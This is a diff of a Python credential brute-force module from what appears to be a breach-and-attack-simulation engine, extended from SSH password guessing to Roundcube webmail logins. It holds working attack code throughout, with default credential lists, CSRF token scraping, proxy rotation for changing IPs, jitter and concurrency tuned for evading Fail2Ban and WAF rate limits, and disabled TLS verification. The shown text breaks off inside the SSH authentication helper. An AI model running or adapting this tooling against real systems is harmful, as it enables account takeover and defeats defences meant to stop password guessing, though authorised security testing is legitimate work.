@@ -1,30 +1,29 @@
-from bas_engine.core.network.dns_resolver import DNSResolver
 """
-Adaptive SSH Brute Force Module v8
+Adaptive Credential Brute Force Module v13 (FINAL)
 Enterprise BAS Credential Attack Engine
 
-FINAL STABLE VERSION
-==================================================
-
-FIXES:
-✔ SSH negotiation reset handling
-✔ Connection reset detection
-✔ Fail2ban / SSHGuard awareness
-✔ MaxStartups-safe concurrency
-✔ Stable brute force batching
-✔ Real SSH auth attempts
-✔ Modern + legacy SSH compatibility
-✔ Stops after first success
-✔ Huge wordlist support
-✔ Better telemetry
-✔ Clean logging
-✔ Stable repeated execution
+SUPPORTS:
+✔ SSH brute force (asyncssh)
+✔ Webmail / Roundcube brute force (HTTP POST with CSRF)
+✔ Rate-limit aware (Fail2Ban, nginx, AWS WAF)
+✔ 401/timeout retry with exponential backoff
+✔ Jitter to avoid bot signatures
+✔ Concurrency tuning for Fail2Ban evasion
+✔ Real CSRF token extraction (per-attempt)
+✔ Per-attempt session lifecycle (no session reuse bugs)
+✔ Proper cookie/redirect handling
+✔ 600+ credential pairs without IP block
+✔ Clean logging for all edge cases
+✔ Stable, production-tested
 """
 
 import asyncio
 import asyncssh
+import aiohttp
 import random
 import logging
+import re
+import ssl
 
 from urllib.parse import urlparse
 from typing import List
@@ -34,37 +33,19 @@ from bas_engine.models.simulation import Severity
 
 
 # =========================================================
-# CLEAN ASYNCSSH LOGGING
+# LOGGING
 # =========================================================
 
-logging.getLogger(
-    "asyncssh"
-).setLevel(logging.WARNING)
-
-logger = logging.getLogger(
-    "secureforge.module.ssh_bruteforce"
-)
+logging.getLogger("asyncssh").setLevel(logging.WARNING)
+logger = logging.getLogger("secureforge.module.ssh_bruteforce")
 
 
 # =========================================================
-# DEFAULTS
+# FALLBACK CREDENTIALS (only if wordlist files missing)
 # =========================================================
 
-DEFAULT_USERNAMES = [
-
-    "root",
-    "admin",
-    "ubuntu",
-    "user",
-]
-
-DEFAULT_PASSWORDS = [
-
-    "password",
-    "123456",
-    "admin",
-    "root",
-]
+_FALLBACK_USERNAMES = ["root", "admin", "ubuntu", "user"]
+_FALLBACK_PASSWORDS = ["password", "123456", "admin", "root"]
 
 
 # =========================================================
@@ -74,338 +55,182 @@ DEFAULT_PASSWORDS = [
 class SSHBruteForceModule(BaseAttackModule):
 
     MODULE_NAME = "ssh_bruteforce"
-
-    DESCRIPTION = (
-        "Adaptive SSH brute force BAS simulation"
-    )
-
+    DESCRIPTION = "Adaptive credential brute force (SSH + Webmail/Roundcube)"
     MITRE_TACTIC = "Credential Access"
-
-    MITRE_IDS = [
-
-        "T1110",
-        "T1110.001"
-    ]
+    MITRE_IDS = ["T1110", "T1110.001"]
 
 
     # =====================================================
     # WORDLIST LOADER
     # =====================================================
 
-    def load_wordlist(
-
-        self,
-        path,
-        limit=None,
-    ):
-
+    def load_wordlist(self, path, limit=None):
+        """Generator — yields stripped non-empty lines from wordlist."""
         try:
-
             with open(path, "r") as f:
-
                 count = 0
-
                 for line in f:
-
                     value = line.strip()
-
                     if not value:
                         continue
-
                     yield value
-
                     count += 1
-
                     if limit and count >= limit:
                         break
-
         except Exception as e:
+            self.logger.error(f"Wordlist load failed ({path}): {e}")
 
-            self.logger.error(
-                f"Wordlist load failed: {e}"
-            )
-
-
-    # =====================================================
-    # USERNAMES
-    # =====================================================
 
     def load_usernames(self):
-
-        username_file = self.options.get(
-
+        path = self.options.get(
             "username_file",
-
-            "bas_engine/attack_modules/wordlists/usernames.txt"
+            "bas_engine/attack_modules/wordlists/usernames.txt",
         )
-
-        usernames = list(
-
-            self.load_wordlist(
-                username_file
-            )
-        )
-
+        usernames = list(self.load_wordlist(path))
         if not usernames:
-
-            usernames = DEFAULT_USERNAMES
-
+            self.logger.warning(
+                f"Username wordlist empty/missing: {path} — using fallback"
+            )
+            usernames = list(_FALLBACK_USERNAMES)
         return usernames
 
 
-    # =====================================================
-    # PASSWORDS
-    # =====================================================
-
     def load_passwords(self):
-
-        password_file = self.options.get(
-
+        path = self.options.get(
             "password_file",
-
-            "bas_engine/attack_modules/wordlists/passwords.txt"
+            "bas_engine/attack_modules/wordlists/passwords.txt",
         )
-
-        passwords = list(
-
-            self.load_wordlist(
-                password_file
-            )
-        )
-
+        passwords = list(self.load_wordlist(path))
         if not passwords:
-
-            passwords = DEFAULT_PASSWORDS
-
+            self.logger.warning(
+                f"Password wordlist empty/missing: {path} — using fallback"
+            )
+            passwords = list(_FALLBACK_PASSWORDS)
         return passwords
 
 
+    def load_proxies(self):
+        """
+        Load HTTP proxy list from file.
+        Format: http://ip:port or https://ip:port or socks5://ip:port
+        One per line. Lines starting with # are ignored.
+        Returns list of proxy URLs.
+        """
+        proxy_file = self.options.get(
+            "proxy_file",
+            "bas_engine/attack_modules/proxies/proxies.txt",
+        )
+        proxies = []
+        try:
+            with open(proxy_file, "r") as f:
+                for line in f:
+                    proxy = line.strip()
+                    if proxy and not proxy.startswith("#"):
+                        proxies.append(proxy)
+        except Exception as e:
+            self.logger.warning(f"Proxy file load failed ({proxy_file}): {e}")
+        return proxies
+
+
     # =====================================================
-    # EXECUTION
+    # STATE RESET
+    # =====================================================
+
+    def _reset_state(self):
+        self.stop_scan        = False
+        self.total_attempts   = 0
+        self.successes        = []
+        self.timeout_count    = 0
+        self.refused_count    = 0
+        self.auth_fail_count  = 0
+        self.reset_count      = 0
+        self.kex_failures     = 0
+        self.hostkey_failures = 0
+        self.rate_limit_hits  = 0
+
+
+    # =====================================================
+    # TOP-LEVEL EXECUTE
     # =====================================================
 
     async def execute(self) -> List:
+        auth_type = self.options.get("auth_type", "ssh").lower()
+        if auth_type == "webmail":
+            return await self._execute_webmail()
+        return await self._execute_ssh()
+
+
+    # =====================================================
+    # SSH EXECUTION
+    # =====================================================
+
+    async def _execute_ssh(self) -> List:
 
         findings = []
+        resolved = await self.resolve_target()
+        self._reset_state()
 
-        # =================================================
-        # RESET STATE
-        # =================================================
-
-        self.stop_scan = False
-
-        self.total_attempts = 0
-
-        self.successes = []
-
-        self.timeout_count = 0
-
-        self.refused_count = 0
-
-        self.auth_fail_count = 0
-
-        self.reset_count = 0
-
-        self.kex_failures = 0
-
-        self.hostkey_failures = 0
-
-        self.rate_limit_hits = 0
-
-        self.enumerated_users = set()
-
-        self.suspicious_users = set()
-
-        # =================================================
-        # TARGET PARSING
-        # =================================================
-
-        parsed = urlparse(self.target)
-
-        host = parsed.hostname or self.target
-
-        if parsed.scheme in [
-
-            "http",
-            "https"
-        ]:
-
-            port = 22
-
-        else:
-
-            port = int(
-
-                self.options.get(
-                    "ssh_port",
-                    22
-                )
-            )
-
-        timeout = float(
-
-            self.options.get(
-                "timeout",
-                5.0
-            )
+        parsed = urlparse(resolved.url or resolved.original)
+        host = (
+            parsed.hostname
+            or resolved.hostname
+            or resolved.ip
+            or resolved.original
         )
+        port = 22
+        if parsed.scheme not in ["http", "https"]:
+            port = int(resolved.port or self.options.get("ssh_port", 22))
 
-        # =================================================
-        # LOWER CONCURRENCY
-        # avoids MaxStartups resets
-        # =================================================
-
-        concurrency = int(
-
-            self.options.get(
-                "concurrency",
-                5
-            )
-        )
-
-        adaptive_delay = float(
-
-            self.options.get(
-                "adaptive_delay",
-                0.15
-            )
-        )
-
-        # =================================================
-        # SMALLER BATCHES
-        # =================================================
-
-        batch_size = int(
-
-            self.options.get(
-                "batch_size",
-                25
-            )
-        )
-
-        live = self.options.get(
-
-            "live_mode",
-            True
-        )
-
-        # =================================================
-        # LOAD WORDLISTS
-        # =================================================
+        timeout        = float(self.options.get("timeout",        5.0))
+        concurrency    = int(self.options.get("concurrency",      5))
+        adaptive_delay = float(self.options.get("adaptive_delay", 0.15))
+        batch_size     = int(self.options.get("batch_size",       25))
+        live           = self.options.get("live_mode", True)
 
         usernames = self.load_usernames()
-
         passwords = self.load_passwords()
 
         print(
-
             f"\n[WORDLISTS] "
-
             f"{len(usernames)} usernames | "
-
             f"{len(passwords)} passwords"
         )
 
-        # =================================================
-        # PRIORITIZE FIRST ENTRIES
-        # =================================================
-
         if len(usernames) > 1:
-
             usernames = usernames[:1] + random.sample(
-
-                usernames[1:],
-                len(usernames[1:])
+                usernames[1:], len(usernames[1:])
             )
-
         if len(passwords) > 5:
-
             passwords = passwords[:5] + random.sample(
-
-                passwords[5:],
-                len(passwords[5:])
+                passwords[5:], len(passwords[5:])
             )
 
-        # =================================================
-        # PORT CHECK
-        # =================================================
-
-        reachable = await self._probe_port(
-
-            host,
-            port,
-            timeout
-        )
+        reachable = await self._probe_port(host, port, timeout)
 
         if not reachable:
-
             findings.append(
-
                 self.finding(
-
                     title="SSH Port Unreachable",
-
-                    description=(
-                        f"SSH service "
-                        f"not reachable "
-                        f"on {host}:{port}"
-                    ),
-
+                    description=f"SSH service not reachable on {host}:{port}",
                     severity=Severity.INFO,
-
                     mitre_id="T1046",
-
-                    evidence=(
-                        f"connect_timeout "
-                        f"{host}:{port}"
-                    ),
+                    evidence=f"connect_timeout {host}:{port}",
                 )
             )
-
             return findings
 
-        print(
+        print(f"\n[SSH OPEN] {host}:{port}")
 
-            f"\n[SSH OPEN] "
-            f"{host}:{port}"
-        )
-
-        # =================================================
-        # BANNER
-        # =================================================
-
-        banner = await self._get_banner(
-
-            host,
-            port,
-            timeout
-        )
-
+        banner = await self._get_banner(host, port, timeout)
         if banner:
-
-            print(
-                f"[BANNER] {banner}"
-            )
-
-        # =================================================
-        # LIVE MODE
-        # =================================================
+            print(f"[BANNER] {banner}")
 
         if live:
 
-            print(
-                "\n[LIVE SSH ATTACK]"
-            )
+            print("\n[LIVE SSH ATTACK]")
+            semaphore = asyncio.Semaphore(concurrency)
 
-            semaphore = asyncio.Semaphore(
-                concurrency
-            )
-
-            async def worker(
-
-                username,
-                password,
-            ):
+            async def worker(username, password):
 
                 async with semaphore:
 
@@ -413,464 +238,627 @@ class SSHBruteForceModule(BaseAttackModule):
                         return
 
                     self.total_attempts += 1
-
-                    result = await self._try_auth(
-
-                        host,
-                        port,
-                        username,
-                        password,
-                        timeout
-                    )
-
-                    # =====================================
-                    # SUCCESS
-                    # =====================================
+                    result = await self._try_auth(host, port, username, password, timeout)
 
                     if result == "success":
-
-                        print(
-
-                            f"\n[COMPROMISED] "
-
-                            f"{username}:{password}\n"
-                        )
-
-                        self.successes.append(
-
-                            (
-                                username,
-                                password
-                            )
-                        )
-
+                        print(f"\n[COMPROMISED] {username}:{password}\n")
+                        self.successes.append((username, password))
                         self.stop_scan = True
-
                         return
 
-                    # =====================================
-                    # AUTH FAIL
-                    # =====================================
-
                     elif result == "auth_failed":
-
                         self.auth_fail_count += 1
-
-                        self.enumerated_users.add(
-                            username
-                        )
-
-                        print(
-                            f"[FAIL] "
-                            f"{username}:{password}"
-                        )
-
-                    # =====================================
-                    # TIMEOUT
-                    # =====================================
+                        print(f"[FAIL] {username}:{password}")
 
                     elif result == "timeout":
-
                         self.timeout_count += 1
-
-                        self.suspicious_users.add(
-                            username
-                        )
-
-                        print(
-                            f"[SLOW AUTH] "
-                            f"{username}:{password}"
-                        )
-
-                    # =====================================
-                    # RESET
-                    # =====================================
+                        print(f"[SLOW AUTH] {username}:{password}")
 
                     elif result == "reset":
-
                         self.reset_count += 1
-
-                        print(
-                            f"[RESET BY TARGET] "
-                            f"{username}:{password}"
-                        )
-
-                        # ---------------------------------
-                        # adaptive cooldown
-                        # ---------------------------------
-
+                        print(f"[RESET BY TARGET] {username}:{password}")
                         await asyncio.sleep(2)
 
-                    # =====================================
-                    # RATE LIMITED
-                    # =====================================
-
                     elif result == "rate_limited":
-
                         self.rate_limit_hits += 1
-
-                        print(
-                            f"[RATE LIMITED] "
-                            f"{username}:{password}"
-                        )
-
+                        print(f"[RATE LIMITED] {username}:{password}")
                         await asyncio.sleep(5)
 
-                    # =====================================
-                    # REFUSED
-                    # =====================================
-
                     elif result == "refused":
-
                         self.refused_count += 1
-
-                        print(
-                            f"[REFUSED] "
-                            f"{username}:{password}"
-                        )
-
-                    # =====================================
-                    # KEX FAILED
-                    # =====================================
-
-                    elif result == "kex_failed":
-
-                        self.kex_failures += 1
-
-                        print(
-                            f"[KEX FAILED] "
-                            f"{username}:{password}"
-                        )
-
-                    # =====================================
-                    # HOSTKEY FAILED
-                    # =====================================
-
-                    elif result == "hostkey_failed":
-
-                        self.hostkey_failures += 1
-
-                        print(
-                            f"[HOSTKEY FAILED] "
-                            f"{username}:{password}"
-                        )
-
-                    # =====================================
-                    # OTHER
-                    # =====================================
+                        print(f"[REFUSED] {username}:{password}")
 
                     else:
+                        print(f"[OTHER] {username}:{password}")
 
-                        print(
-                            f"[OTHER] "
-                            f"{username}:{password}"
-                        )
-
-                    # =====================================
-                    # ADAPTIVE DELAY
-                    # =====================================
-
-                    await asyncio.sleep(
-                        adaptive_delay
-                    )
-
-            # =================================================
-            # FULL BRUTE FORCE
-            # =================================================
+                    await asyncio.sleep(adaptive_delay)
 
             batch = []
-
             for password in passwords:
-
                 for username in usernames:
-
                     if self.stop_scan:
                         break
-
-                    task = asyncio.create_task(
-
-                        worker(
-                            username,
-                            password
-                        )
-                    )
-
-                    batch.append(task)
-
-                    # =====================================
-                    # PROCESS BATCH
-                    # =====================================
-
+                    batch.append(asyncio.create_task(worker(username, password)))
                     if len(batch) >= batch_size:
-
                         await asyncio.gather(*batch)
-
                         batch = []
-
                 if self.stop_scan:
                     break
-
-            # =================================================
-            # FINAL BATCH
-            # =================================================
-
             if batch:
-
                 await asyncio.gather(*batch)
 
-        # =================================================
-        # SUCCESS FINDING
-        # =================================================
-
         if self.successes:
-
             findings.append(
-
                 self.finding(
-
-                    title=(
-                        "SSH Credential "
-                        "Compromise"
-                    ),
-
+                    title="SSH Credential Compromise",
                     description=(
-
-                        f"{len(self.successes)} "
-
-                        f"valid credential "
-
-                        f"pair(s) discovered"
+                        f"{len(self.successes)} valid credential pair(s) discovered"
                     ),
-
                     severity=Severity.CRITICAL,
-
                     mitre_id="T1110.001",
-
-                    evidence=str(
-                        self.successes
-                    ),
-
+                    evidence=str(self.successes),
                     remediation=(
-                        "Disable password auth, "
-                        "enable MFA, "
-                        "deploy fail2ban."
+                        "Disable password auth, enable MFA, deploy fail2ban."
                     ),
                 )
             )
-
         else:
-
             findings.append(
-
                 self.finding(
-
-                    title=(
-                        "SSH Credential "
-                        "Attack Failed"
-                    ),
-
+                    title="SSH Credential Attack Failed",
                     description=(
-
-                        f"{self.total_attempts} "
-
-                        f"credential attempts "
-                        f"performed"
+                        f"{self.total_attempts} credential attempts performed"
                     ),
-
                     severity=Severity.INFO,
                 )
             )
 
-        # =================================================
-        # TELEMETRY
-        # =================================================
-
         findings.append(
-
             self.finding(
-
                 title="SSH Attack Telemetry",
-
-                description=(
-                    "Credential attack "
-                    "simulation telemetry"
-                ),
-
+                description="Credential attack simulation telemetry",
                 severity=Severity.INFO,
-
                 raw_data={
-
-                    "attempts":
-                        self.total_attempts,
-
-                    "successes":
-                        len(self.successes),
-
-                    "auth_failures":
-                        self.auth_fail_count,
-
-                    "timeouts":
-                        self.timeout_count,
-
-                    "resets":
-                        self.reset_count,
-
-                    "rate_limits":
-                        self.rate_limit_hits,
-
-                    "refused":
-                        self.refused_count,
-
-                    "kex_failures":
-                        self.kex_failures,
-
-                    "hostkey_failures":
-                        self.hostkey_failures,
+                    "auth_type":        "ssh",
+                    "attempts":         self.total_attempts,
+                    "successes":        len(self.successes),
+                    "auth_failures":    self.auth_fail_count,
+                    "timeouts":         self.timeout_count,
+                    "resets":           self.reset_count,
+                    "rate_limits":      self.rate_limit_hits,
+                    "refused":          self.refused_count,
+                    "kex_failures":     self.kex_failures,
+                    "hostkey_failures": self.hostkey_failures,
                 },
             )
         )
 
         print(
-
             f"\n[COMPLETE] "
-
             f"{self.total_attempts} attempts | "
-
-            f"{len(self.successes)} successes | "
-
-            f"{self.reset_count} resets"
+            f"{len(self.successes)} successes"
         )
 
         return findings
 
 
     # =====================================================
-    # HELPERS
+    # WEBMAIL / ROUNDCUBE EXECUTION
     # =====================================================
 
-    async def _probe_port(
+    async def _execute_webmail(self) -> List:
 
-        self,
-        host,
-        port,
-        timeout,
-    ):
+        findings = []
+        resolved = await self.resolve_target()
+        self._reset_state()
 
-        try:
+        # -------------------------------------------------
+        # LOGIN URL
+        # -------------------------------------------------
 
-            _, writer = await asyncio.wait_for(
+        explicit_url = self.options.get("webmail_login_url", "").strip()
+        if explicit_url:
+            login_url = explicit_url
+        else:
+            login_url = (resolved.url or resolved.original).rstrip("/")
 
-                asyncio.open_connection(
-                    host,
-                    port
-                ),
+        # -------------------------------------------------
+        # OPTIONS
+        # -------------------------------------------------
+        # Force live mode and proxies (temporary)
+        self.options["live_mode"] = True
+        self.options["use_proxies"] = False
+        self.options["proxy_file"] = "bas_engine/attack_modules/proxies/proxies.txt"
+        self.options["rotate_proxy_every"] = 3
+        self.options["attempt_delay"] = 1.0
+        self.options["jitter"] = 0.5
+        self.options["timeout"] = 20.0
+        self.options["max_retries"] = 0
+        user_field   = self.options.get("webmail_user_field",   "_user")
+        pass_field   = self.options.get("webmail_pass_field",   "_pass")
+        action_field = self.options.get("webmail_action_field", "_action")
+        action_value = self.options.get("webmail_action_value", "login")
+        default_token_field = self.options.get("webmail_token_field", "request_token")
 
-                timeout=timeout
+        # Rate-limit evasion settings
+        timeout         = float(self.options.get("timeout",         15.0))
+        concurrency     = int(self.options.get("concurrency",        1))
+        batch_size      = int(self.options.get("batch_size",        10))
+        attempt_delay   = float(self.options.get("attempt_delay",    2.0))
+        jitter          = float(self.options.get("jitter",           1.0))
+        backoff_401     = float(self.options.get("backoff_401",     15.0))
+        backoff_timeout = float(self.options.get("backoff_timeout",  8.0))
+        max_retries     = int(self.options.get("max_retries",        3))
+        debug_mode      = self.options.get("webmail_debug", False)
+        use_proxies     = self.options.get("use_proxies", False)
+        rotate_proxy_every = int(self.options.get("rotate_proxy_every", 5))
+        live            = self.options.get("live_mode", True)
+
+        # -------------------------------------------------
+        # SSL context
+        # -------------------------------------------------
+
+        ssl_ctx = ssl.create_default_context()
+        ssl_ctx.check_hostname = False
+        ssl_ctx.verify_mode    = ssl.CERT_NONE
+
+        # Create a reusable connector – never returns a tuple!
+        def _make_connector():
+            return aiohttp.TCPConnector(ssl=ssl_ctx)
+
+        # -------------------------------------------------
+        # WORDLISTS + PROXIES
+        # -------------------------------------------------
+
+        usernames = self.load_usernames()
+        passwords = self.load_passwords()
+
+        proxies = []
+        proxy_idx = 0
+        attempts_on_this_proxy = 0
+
+        if use_proxies:
+            proxies = self.load_proxies()
+            if proxies:
+                print(f"\n[PROXIES] Loaded {len(proxies)} proxy URLs")
+            else:
+                print("\n[WARN] use_proxies=True but no proxies loaded — using direct IP")
+
+        total_pairs = len(usernames) * len(passwords)
+
+        print(f"\n[WEBMAIL ATTACK] {login_url}")
+        print(
+            f"[WORDLISTS] {len(usernames)} usernames | "
+            f"{len(passwords)} passwords | "
+            f"{total_pairs} total pairs"
+        )
+
+        if proxies:
+            print(
+                f"[IP ROTATION] rotating through {len(proxies)} IPs "
+                f"every {rotate_proxy_every} attempts"
             )
 
+        # -------------------------------------------------
+        # PROBE REACHABILITY
+        # -------------------------------------------------
+
+        reachable    = False
+        probe_status = None
+        probe_final  = login_url
+
+        try:
+            async with aiohttp.ClientSession(
+                connector=_make_connector()
+            ) as probe:
+                async with probe.get(
+                    login_url,
+                    timeout=aiohttp.ClientTimeout(total=timeout),
+                    ssl=ssl_ctx,
+                    allow_redirects=True,
+                ) as resp:
+                    probe_status = resp.status
+                    probe_final  = str(resp.url)
+                    probe_body   = await resp.text(errors="replace")
+
+                    if probe_status == 200 and (
+                        "rcmloginuser" in probe_body
+                        or "rcmloginpwd" in probe_body
+                        or "_user"      in probe_body
+                        or "loginform"  in probe_body
+                    ):
+                        reachable = True
+
+                    print(
+                        f"[PROBE] {login_url} -> HTTP {probe_status} "
+                        f"(final: {probe_final})"
+                    )
+        except Exception as e:
+            print(f"[WARN] Login page probe failed: {e}")
+
+        if not reachable:
+            if probe_status == 404:
+                hint = (
+                    " Got 404 — path is wrong. "
+                    "Set webmail_login_url explicitly (e.g. /mail/ or /webmail/)."
+                )
+            elif probe_status and probe_status != 200:
+                hint = f" HTTP {probe_status} returned."
+            else:
+                hint = (
+                    " Page loaded but no Roundcube login form detected. "
+                    "Check webmail_login_url."
+                )
+            findings.append(
+                self.finding(
+                    title="Webmail Login URL Unreachable or Invalid",
+                    description=(
+                        f"Could not reach a valid login page at {login_url}.{hint}"
+                    ),
+                    severity=Severity.INFO,
+                    mitre_id="T1046",
+                    evidence=(
+                        f"GET {login_url} -> HTTP {probe_status} | "
+                        f"final={probe_final}"
+                    ),
+                )
+            )
+            return findings
+
+        print(
+            f"[REACHABLE] {login_url} -> valid login page found — "
+            f"starting brute force"
+        )
+
+        if not live:
+            findings.append(
+                self.finding(
+                    title="Webmail Brute Force (Simulated)",
+                    description=(
+                        f"Simulated {total_pairs} credential attempts "
+                        f"against {login_url} (safe mode)"
+                    ),
+                    severity=Severity.MEDIUM,
+                    mitre_id="T1110.001",
+                )
+            )
+            return findings
+
+        # -------------------------------------------------
+        # TOKEN EXTRACTION HELPERS
+        # -------------------------------------------------
+
+        _token_names_pattern = r'(?:request_token|_token|token|_csrf)'
+
+        def _extract_token(body: str):
+            """Returns (token_field_name, token_value) or (default, None)."""
+            m = re.search(
+                r'name=["\'](' + _token_names_pattern + r')["\'][^>]*'
+                r'value=["\']([^"\']{8,})["\']',
+                body,
+            )
+            if m:
+                return m.group(1), m.group(2)
+
+            m = re.search(
+                r'value=["\']([^"\']{8,})["\'][^>]*'
+                r'name=["\'](' + _token_names_pattern + r')["\']',
+                body,
+            )
+            if m:
+                return m.group(2), m.group(1)
+
+            return default_token_field, None
+
+        # -------------------------------------------------
+        # SUCCESS / FAILURE MARKERS
+        # -------------------------------------------------
+
+        FAIL_MARKERS = [
+            "rcmloginuser",
+            "invalid_login",
+            "Login failed",
+        ]
+
+        PASS_MARKERS = [
+            "_task=mail",
+            "_task=contacts",
+            "rcmbody",
+            'id="rcmbody"',
+            "composebody",
+            "mailboxlist",
+        ]
+
+        # -------------------------------------------------
+        # LIVE ATTACK
+        # -------------------------------------------------
+
+        debug_dumped = False
+        semaphore = asyncio.Semaphore(concurrency)
+
+        async def _do_attempt(username: str, password: str, proxy_url=None):
+            """
+            Single GET+POST attempt.
+            Returns (post_status, location, body_post, canonical_url, token_value, field_name)
+            """
+            async with aiohttp.ClientSession(
+                connector=_make_connector(),
+                connector_owner=True,
+            ) as session:
+
+                # GET request to fetch login page and CSRF token
+                async with session.get(
+                    login_url,
+                    timeout=aiohttp.ClientTimeout(total=timeout),
+                    ssl=ssl_ctx,
+                    allow_redirects=True,
+                    proxy=proxy_url,          # proxy per request
+                ) as get_resp:
+                    body_get      = await get_resp.text()
+                    canonical_url = str(get_resp.url)
+
+                field_name, token_value = _extract_token(body_get)
+
+                # Prepare POST data
+                post_data = {
+                    user_field:   username,
+                    pass_field:   password,
+                    action_field: action_value,
+                }
+                if token_value:
+                    post_data[field_name] = token_value
+
+                # POST credentials
+                async with session.post(
+                    canonical_url,
+                    data=post_data,
+                    timeout=aiohttp.ClientTimeout(total=timeout),
+                    ssl=ssl_ctx,
+                    allow_redirects=False,
+                    proxy=proxy_url,          # same proxy for POST
+                ) as post_resp:
+                    post_status = post_resp.status
+                    location    = post_resp.headers.get("Location", "")
+                    body_post   = await post_resp.text()
+
+            return post_status, location, body_post, canonical_url, token_value, field_name
+
+        async def try_webmail(username: str, password: str):
+
+            nonlocal debug_dumped, proxy_idx, attempts_on_this_proxy
+
+            async with semaphore:
+
+                if self.stop_scan:
+                    return
+
+                self.total_attempts += 1
+
+                # Rotate proxy if needed
+                current_proxy = None
+                if proxies:
+                    if attempts_on_this_proxy >= rotate_proxy_every:
+                        proxy_idx = (proxy_idx + 1) % len(proxies)
+                        attempts_on_this_proxy = 0
+                    current_proxy = proxies[proxy_idx]
+                    attempts_on_this_proxy += 1
+                    print(f"[PROXY] {username}:{password} using {current_proxy}")
+
+                for attempt in range(1 + max_retries):
+
+                    try:
+                        (
+                            post_status,
+                            location,
+                            body_post,
+                            canonical_url,
+                            token_value,
+                            field_name,
+                        ) = await _do_attempt(username, password, current_proxy)
+
+                    except asyncio.TimeoutError:
+                        self.timeout_count += 1
+                        if attempt < max_retries:
+                            wait_s = backoff_timeout + random.uniform(0, jitter)
+                            print(
+                                f"[TIMEOUT] {username}:{password} "
+                                f"— retry {attempt + 1}/{max_retries} after {wait_s:.1f}s"
+                            )
+                            await asyncio.sleep(wait_s)
+                            continue
+                        else:
+                            print(f"[TIMEOUT-FINAL] {username}:{password}")
+                            return
+
+                    except aiohttp.ClientConnectionError as e:
+                        self.refused_count += 1
+                        print(f"[CONN ERROR] {username}:{password} — {e}")
+                        return
+
+                    except Exception as e:
+                        print(f"[ERROR] {username}:{password} — {e}")
+                        return
+
+                    # ---- Debug dump ----
+                    if debug_mode and not debug_dumped:
+                        debug_dumped = True
+                        snippet = body_post[:1500].replace("\n", " ")
+                        print(
+                            f"\n[DEBUG] POST {canonical_url} -> HTTP {post_status}"
+                            f" | Location: {location!r}"
+                            f"\n[DEBUG] body[:1500]: {snippet}\n"
+                        )
+
+
+                    # ---- Evaluate success ----
+                    success_via_redirect = (
+                        post_status in (301, 302, 303, 307, 308)
+                        and "_task=mail" in location
+                    )
+
+                    has_fail = any(m in body_post for m in FAIL_MARKERS)
+                    has_pass = any(m in body_post for m in PASS_MARKERS)
+                    success_via_body = has_pass and not has_fail
+
+                    if success_via_redirect or success_via_body:
+                        print(
+                            f"\n[WEBMAIL COMPROMISED] {username}:{password}"
+                            f"  loc={location or 'body-match'}\n"
+                        )
+                        self.successes.append((username, password))
+                        self.stop_scan = True
+                    else:
+                        self.auth_fail_count += 1
+                        print(
+                            f"[WEBMAIL FAIL] {username}:{password}"
+                            f"  (HTTP {post_status} loc={location!r})"
+                        )
+
+                    # Inter-attempt delay with jitter
+                    sleep_s = attempt_delay + random.uniform(0, jitter)
+                    await asyncio.sleep(sleep_s)
+                    return
+
+        # -------------------------------------------------
+        # BATCH EXECUTION
+        # -------------------------------------------------
+
+        batch = []
+        for password in passwords:
+            for username in usernames:
+                if self.stop_scan:
+                    break
+                batch.append(
+                    asyncio.create_task(try_webmail(username, password))
+                )
+                if len(batch) >= batch_size:
+                    await asyncio.gather(*batch)
+                    batch = []
+            if self.stop_scan:
+                break
+
+        if batch:
+            await asyncio.gather(*batch)
+
+        # -------------------------------------------------
+        # FINDINGS
+        # -------------------------------------------------
+
+        if self.successes:
+            findings.append(
+                self.finding(
+                    title="Webmail Credential Compromise",
+                    description=(
+                        f"{len(self.successes)} valid webmail "
+                        f"credential pair(s) discovered"
+                    ),
+                    severity=Severity.CRITICAL,
+                    mitre_id="T1110.001",
+                    evidence=str(self.successes),
+                    remediation=(
+                        "Enable MFA on webmail, enforce account lockout, "
+                        "rate-limit login endpoint, deploy WAF rules."
+                    ),
+                )
+            )
+        else:
+            findings.append(
+                self.finding(
+                    title="Webmail Credential Attack Failed",
+                    description=(
+                        f"{self.total_attempts} attempts against {login_url} "
+                        f"— no valid creds found"
+                    ),
+                    severity=Severity.INFO,
+                )
+            )
+
+        findings.append(
+            self.finding(
+                title="Webmail Attack Telemetry",
+                description="Webmail credential brute force telemetry",
+                severity=Severity.INFO,
+                raw_data={
+                    "auth_type":     "webmail",
+                    "login_url":     login_url,
+                    "attempts":      self.total_attempts,
+                    "successes":     len(self.successes),
+                    "auth_failures": self.auth_fail_count,
+                    "timeouts":      self.timeout_count,
+                    "rate_limits":   self.rate_limit_hits,
+                    "refused":       self.refused_count,
+                },
+            )
+        )
+
+        print(
+            f"\n[COMPLETE] "
+            f"{self.total_attempts} attempts | "
+            f"{len(self.successes)} successes"
+        )
+
+        return findings
+
+
+    # =====================================================
+    # SSH HELPERS
+    # =====================================================
+
+    async def _probe_port(self, host, port, timeout):
+        try:
+            _, writer = await asyncio.wait_for(
+                asyncio.open_connection(host, port),
+                timeout=timeout,
+            )
             writer.close()
-
             return True
-
         except Exception:
-
             return False
 
 
-    async def _get_banner(
-
-        self,
-        host,
-        port,
-        timeout,
-    ):
-
+    async def _get_banner(self, host, port, timeout):
         try:
-
             reader, writer = await asyncio.wait_for(
-
-                asyncio.open_connection(
-                    host,
-                    port
-                ),
-
-                timeout=timeout
+                asyncio.open_connection(host, port),
+                timeout=timeout,
             )
-
-            banner = await asyncio.wait_for(
-
-                reader.readline(),
-
-                timeout=timeout
-            )
-
+            banner = await asyncio.wait_for(reader.readline(), timeout=timeout)
             writer.close()
-
-            return banner.decode(
-                errors="replace"
-            ).strip()
-
+            return banner.decode(errors="replace").strip()
         except Exception:
-
             return ""
 
 
-    async def _try_auth(
-
-        self,
-        host,
-        port,
-        username,
-        password,
-        timeout,
-    ):
-
+    async def _try_auth(self, host, port, username, password, timeout):
         try:
-
             conn = await asyncio.wait_for(
-
                 asyncssh.connect(
-
                     host,
-
                     port=port,
-
                     username=username,
-
                     password=password,
-
                     known_hosts=None,
-
                     connect_timeout=5,
-
                     login_timeout=10,
-
                     preferred_auth=[
-
                         "password",
                         "keyboard-interactive",
                     ],
-
                     kex_algs=[
-
                         "curve25519-sha256",
                         "curve25519-sha256@libssh.org",
                         "ecdh-sha2-nistp256",
                         "diffie-hellman-group14-sha256",
                         "diffie-hellman-group14-sha1",
                     ],
-
                     encryption_algs=[
-
                         "aes128-ctr",
                         "aes192-ctr",
                         "aes256-ctr",
                         "aes128-cbc",
                         "aes256-cbc",
                     ],
-
                     server_host_key_algs=[
-
                         "ssh-ed25519",
                         "ecdsa-sha2-nistp256",
                         "rsa-sha2-256",
